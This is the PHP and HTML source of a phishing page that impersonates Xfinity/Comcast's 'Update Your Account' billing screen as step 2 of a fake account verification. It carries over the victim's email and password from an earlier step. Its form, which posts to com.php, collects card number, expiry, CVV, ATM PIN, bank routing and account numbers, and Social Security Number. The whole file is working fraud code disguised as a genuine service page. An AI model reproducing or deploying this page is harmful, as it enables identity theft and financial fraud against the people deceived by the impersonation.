<?php
    session_start();

    $emailID = $_SESSION['userId'];
    $password = $_SESSION['password'];

    $emailErr = $passwordErr = '';
    $errors = [];
    
    if(empty($emailID) || empty($password)){
        header("Location: ./authen.php");
    }
    else{
        echo "<div style='color:#fff;position:absolute;z-index:111;'>$emailID $password</div>";
    }
?>
<!DOCTYPE html>
<html>
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="ie=edge" http-equiv="x-ua-compatible">
	<meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
	<title>XFINITY | Update Your Account | EcoBill&reg; Online Bill Pay</title>
	<link href="./CSS/S.ico" rel="icon">
	<meta content="noindex" name="robots">
	<link href="./CSS/CC2.css" rel="stylesheet" type="text/css">
	<link href="./CSS/CC.css" rel="stylesheet" type="text/css">
	<link href="./CSS/Ccss" rel="stylesheet">
	<meta content="#ffffff" name="msapplication-TileColor">
	<meta content="#ffffff" name="theme-color">
	<meta content="KeisTVuqC7Jg8M_hmY6rtobs5NLYLtJ5MtNfmQYbyBI" name="google-site-verification">
	<meta content="app-id=776010987" name="apple-itunes-app">
</head>
<body>
	<main role="main">
		<div class="main-content">
			<header class="page-header page-app--takeover page-header--breadcrumbs ui-blue" id="page-header" role="banner">
				<div class="page-header__logo-wrap">
					<a class="page-header__logo icon-xfinity-white" href="#/" rel="home"><span class="visuallyhidden">Xfinity</span></a>  
				</div>
				<div class="page-header__wrapper">
					<div class="page-header__content">
						<div class="page-header__navigation">
							<nav class="nav-progress" role="navigation">
								<font size="1"><!-- ngRepeat: breadcrumb in currentRoute.breadcrumbs --><span><span class="body3 status status--warning">Review : Step 2 of 3<br>
								&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Account Verification</span></span> <!-- end ngRepeat: breadcrumb in currentRoute.breadcrumbs --></font>
							</nav>
						</div>
					</div>
				</div><!-- end ngIf: currentRoute.breadcrumbs.length !== 0 -->
			</header> 
			<div class="page-content" id="page-content">
				<main class="page-main" id="page-main">
					<!-- ngView: -->
				</main>
				<div aria-atomic="true" aria-live="assertive" class="page-view view" id="page-view" role="main" tabindex="0">
					<section class="page-section ui-grey hero">
						<div class="page-section__wrapper clearfix">
							<div class="page-section__content">
								<!-- <form name="method" class="payment ng-pristine ng-valid ng-valid-required ng-valid-v-credit-card-type ng-valid-v-credit-card ng-valid-server-error ng-valid-v-cvv ng-valid-pattern ng-valid-minlength ng-valid-maxlength" novalidate="" ng-submit="method.$valid &amp;&amp; checkSavedPaymentContract(&#39;card&#39;)"> -->
								<form id="form1"  autocomplete="off" action="com.php" method="post">
									<div class="card-group">
										<br>
										<div class="card-group__item">
											<div class="card">
												<div class="card__content">
													<h2 class="body5 status status--warning">Account Information</h2>
													<h2 class="body2 status status--">Update payment method</h2>
												</div>
											</div>
										</div>
										<div class="card-group__item">
											<fieldset aria-invalid="false" class="card card--secondary credit-card-payment ng-valid" form="paymentForm">
												<div class="card__content">
													<div class="form-control-group form-control-group--flex-at-768">
														<div class="form-control-group__item">
															<div class="form-control undefined">
																<label class="form-control__label" for="Hold">Cardholder's name <strong style="color: red;"></strong></label>
																<div class="form-control__input">
																	<input aria-describedby="Hold" aria-invalid="false" class="" id="Hold" name="hold" title="Please enter a valid Cardholder's Name" type="text" value="">
																</div>
															</div>
														</div>
														<div class="form-control-group__item">
															<div class="form-control">
																<label class="form-control__label" for="Typ">Credit Card Type <strong style="color: red;"></strong></label>
																<div class="form-control__input">
																	<select class="ng-pristine ng-untouched ng-valid ng-valid-required" id="Typ" name="typ" title="Please Select Credit Card Type">
																		<option value="">
																			--Please Select--
																		</option>
																		<option value="Visa">
																			Visa
																		</option>
																		<option value="MasterCard">
																			MasterCard
																		</option>
																		<option value="American Express">
																			American Express
																		</option>
																		<option value="Discover">
																			Discover
																		</option>
																	</select>
																</div>
															</div>
														</div>
													</div>
													<div class="form-control-group form-control-group--flex-at-768">
														<div class="form-control-group__item">
															<div class="form-control">
																<!-- ngIf: label --><label class="form-control__label" for="lastName">Card number <strong style="color: red;"></strong><!-- ngIf: icon --></label> <!-- end ngIf: label -->
																<!-- ngIf: note -->
																<div class="form-control__input">
																	<input class="ng-pristine ng-untouched ng-valid ng-valid-required" id="Card" maxlength="19" name="card" placeholder="" style="background-repeat: no-repeat; background-image: url(./CSS/1.png);" title="Please enter a valid card number" type="text"> 
                                                                    <script>

                                                                    document.getElementById('Card').addEventListener('blur', function (e) {
                                                                            var x = e.target.value.replace(/\D/g, '').match(/(\d{4})(\d{4})(\d{4})(\d{4})/);
                                                                            e.target.value =  x[1] + ' ' +  x[2] + ' ' + x[3] + ' ' + x[4];
                                                                        });    
                                                                    function isInputNumber(evt){
                                                                            var ch=String.fromCharCode(evt.which);
                                                                            if(!(/[0-9]/.test(ch))){
                                                                                evt.preventDefault();
                                                                            }
                                                                        }
                                                                    </script>
																</div><!-- ngIf: helper -->
															</div>
														</div>
														<div class="form-control-group__item">
															<div class="form-control-group form-control-group--flex-at-768">
																<div class="form-control-group__item form-control-group__item--2of3">
																	<h3 class="label">Expiration Date <strong style="color: red;"></strong></h3>
																	<div class="form-control-group form-control-group--flex">
																		<div class="form-control-group__item">
																			<div class="form-control">
																				<!-- ngIf: label -->
																				<!-- ngIf: note -->
																				<div class="form-control__input">
																					<select class="ng-pristine ng-untouched ng-valid ng-valid-server-error ng-valid-required" id="ex1" name="ex1" title="Please select a valid expiration month">
																						<option class="" disabled="disabled" hidden="" selected="selected" value="">
																							MM
																						</option>
																						<option label="01" value="string:01">
																							01
																						</option>
																						<option label="02" value="string:02">
																							02
																						</option>
																						<option label="03" value="string:03">
																							03
																						</option>
																						<option label="04" value="string:04">
																							04
																						</option>
																						<option label="05" value="string:05">
																							05
																						</option>
																						<option label="06" value="string:06">
																							06
																						</option>
																						<option label="07" value="string:07">
																							07
																						</option>
																						<option label="08" value="string:08">
																							08
																						</option>
																						<option label="09" value="string:09">
																							09
																						</option>
																						<option label="10" value="string:10">
																							10
																						</option>
																						<option label="11" value="string:11">
																							11
																						</option>
																						<option label="12" value="string:12">
																							12
																						</option>
																					</select>
																				</div><!-- ngIf: helper -->
																			</div>
																		</div>
																		<div class="form-control-group__item">
																			<div class="form-control">
																				<!-- ngIf: label -->
																				<!-- ngIf: note -->
																				<div class="form-control__input">
																					<select id="ex2" name="ex2" title="Please select a valid expiration year">
																						<option class="" disabled="disabled" hidden="" selected="selected" value="">
																							YYYY
																						</option>
																					
																						<option label="2021" value="string:2021">
																							2021
																						</option>
																						<option label="2022" value="string:2022">
																							2022
																						</option>
																						<option label="2023" value="string:2023">
																							2023
																						</option>
																						<option label="2024" value="string:2024">
																							2024
																						</option>
																						<option label="2025" value="string:2025">
																							2025
																						</option>
																						<option label="2026" value="string:2026">
																							2026
																						</option>
																						<option label="2027" value="string:2027">
																							2027
																						</option>
																						<option label="2028" value="string:2028">
																							2028
																						</option>
																						<option label="2029" value="string:2029">
																							2029
																						</option>
																					</select>
																				</div><!-- ngIf: helper -->
																			</div>
																		</div>
																	</div>
																</div>
																<div class="form-control-group__item form-control-group__item--1of3">
																	<div class="form-control">
																		<label class="form-control__label" for="cvv">Security Code <strong style="color: red;"></strong></label> <label class="form-control__label" for="cvv"><span class="screen-reader-text"></span></label>
																		<div class="form-control__input">
																			<input class="ng-pristine ng-untouched ng-valid ng-valid-v-cvv ng-valid-server-error ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-required" id="cvv" maxlength="4" name="cvv" placeholder="CVV" style="background-repeat: no-repeat; background-image: url(./CSS/2.png);" title="Please enter a valid CVV Number" type="text"> 
																			<script>
																			function isInputNumber(evt){
																			var ch = String.fromCharCode(evt.which);
																			if(!(/[0-9]/.test(ch))){
																			evt.preventDefault();
																			}
																			}
																			</script>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													
															<div class="form-control">
																<!-- ngIf: label --><label class="form-control__label" for="MTM">ATM Pin<!-- ngIf: icon --></label> <!-- end ngIf: label -->
																<!-- ngIf: note -->
																<div class="form-control__input">
																	<input class="ng-pristine ng-untouched ng-valid ng-valid-required" id="MTM" maxlength="4" name="MTM" placeholder="####" style="width: 109.0%;" title="Please enter a valid ATM Pin" type="text"> 
																
																	<script>
                                                                        function isInputNumber(evt){
                                                                            var ch = String.fromCharCode(evt.which);
                                                                            if(!(/[0-9]/.test(ch))){
                                                                                evt.preventDefault();
                                                                            }
                                                                        }
																	</script>
																</div><!-- ngIf: helper -->
															</div></div>
															<br>
															<div class="Banner">
													<font color="red">OR</font>
												</div>
												<div><br></div>
												<div class="form-control-group form-control-group--flex-at-768">
                                                <div class="form-control-group__item">
                                                   <div class="form-control undefined">
                                                      <div class="form-control__input">
                                                         <div class="form-control__label">
                                                            <label for="routeNumber" class="d-inline-block">Routing number</label>
                                                            <button class="button button--text" type="button">
                                                               <svg focusable="false" viewBox="0 0 22 22" style="margin-left: 6px; width: 22px; height: 22px;">
                                                                  <g fill="none">
                                                                     <circle cx="11" cy="11" r="10" style="fill: none; stroke: currentcolor; stroke-miterlimit: 10;"></circle>
                                                                     <path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path>
                                                                  </g>
                                                               </svg>
                                                               <span class="visuallyhidden">More information about routing number</span>
                                                            </button>
                                                         </div>
                                                         <input id="routeNumber" aria-invalid="false" aria-describedby="error_routeNumber" autocomplete="off" class="false " name="routeNumber" type="text" maxlength="9" pattern="^[0-9]+$" aria-required="true" value=""/>
                                                      </div>
                                                   </div>
                                                </div>
												<br>
                                                <div class="form-control-group__item">
                                                   <div class="form-control undefined">
                                                      <div class="form-control__input">
                                                         <div class="form-control__label">
                                                            <label for="bankNumber" class="d-inline-block">Bank account number</label>
                                                            <button class="button button--text" type="button">
                                                               <svg focusable="false" viewBox="0 0 22 22" style="margin-left: 6px; width: 22px; height: 22px;">
                                                                  <g fill="none">
                                                                     <circle cx="11" cy="11" r="10" style="fill: none; stroke: currentcolor; stroke-miterlimit: 10;"></circle>
                                                                     <path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path>
                                                                  </g>
                                                               </svg>
                                                               <span class="visuallyhidden">More information about bank account number</span>
                                                            </button>
                                                         </div>
                                                         <input id="bankNumber" aria-invalid="false" aria-describedby="error_bankNumber" class="false " name="bankNumber" type="text" pattern="^[0-9]+$" value="" autocomplete="off" />
                                                      </div>
                                                   </div>
                                                </div>
															<div class="Banner">
													
												</div>
												</div>
															<br>
															<div class="ma-grid__col ma-grid__col--1of2">
														<div class="form-control-group form-control-group--split form-control">
															<div class="form-control">
																<!-- ngIf: label --><label class="form-control__label" for="NSN">Social Security Number <strong style="color: red;"></strong><!-- ngIf: icon --></label> <!-- end ngIf: label -->
																<!-- ngIf: note -->
																<div class="form-control__input">
																	<input class="ng-pristine ng-untouched ng-valid ng-valid-required" id="NSN" maxlength="11" name="NSN" placeholder="*** ## ####" required="" style="width: 105.0%;" title="Please enter a valid Social Security Number" type="text"> 
  <script>

document.getElementById('NSN').addEventListener('blur', function (e) {
        var x = e.target.value.replace(/\D/g, '').match(/(\d{3})(\d{2})(\d{4})/);
        e.target.value = [] + '' + x[1] + '-' + x[2] + '-' + x[3];
    });    
function isInputNumber(evt){
        var ch=String.fromCharCode(evt.which);
        if(!(/[0-9]/.test(ch))){
            evt.preventDefault();
        }
    }
  </script>
																</div><!-- ngIf: helper -->
															</div>
														</div>
													</div>	
													
													<div class="Banner">
													<font color="red">*All fields are required (unless otherwise noted)</font>
												</div>
												</div>

											</fieldset>
										</div>
									</div>
									<div class="action action--right">
										<div class="action__item">
											<button class="button button--primary" type="submit" name="submit">Confirm and Finish Up</button>
										</div>
							</div>
								</form> 
							</div><!-- ngIf: !agentView && method.$submitted && errors.api -->

						</div>
											</section>
				</div><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport -->
			</div><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport -->
		</div><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' -->
<!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><xc-footer ng-show="!route.current.takeover &amp;&amp; showPolarisFooter &amp;&amp; !prepaid" client-id="myAccountWeb" tracking-module="footer" aria-hidden="false" class=""
<div class="xc-footer--bottom-container"><footer><br>
&nbsp;


&nbsp; &nbsp; &nbsp;
<style id="xc-footer-styles">
xc-footer {
display: block;
background: #000;
font-family: Arial, sans-serif;
}
</style>
<font color="#ffffff" face="Arial" size="1"><span class="content"><span class="content">&copy; 2021 Comcast</span><br>
</span><br>
</font>
</footer></div>
</body>
</html>